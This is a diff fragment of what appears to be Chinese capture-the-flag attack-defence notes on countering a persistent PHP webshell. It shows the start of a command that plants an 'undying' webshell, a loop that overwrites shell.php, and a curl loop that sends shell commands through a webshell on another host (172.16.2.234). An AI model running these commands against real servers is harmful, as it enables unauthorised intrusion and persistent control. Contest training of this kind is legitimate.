@@ -381,7 +381,9 @@ echo '<?php unlink(".1.php");ignore_user_abort(true);set_time_limit(0);$code="PD
 ### 对抗不死马
 根据日志发现攻击日志。
 ```
-while (true);do echo test >/var/www/html/shell.php;done &
+while true;do echo test >/var/www/html/shell.php;chmod 000 /var/www/html/shell.php;done &
+
+while true;do curl "http://172.16.2.234:8051/.2.php" -d "1=echo sb > xvwa/vulnerabilities/cmdi/bird1.php;chmod 444 xvwa/vulnerabilities/cmdi/bird1.php";done
 ```
 
 ## 批量提交flag
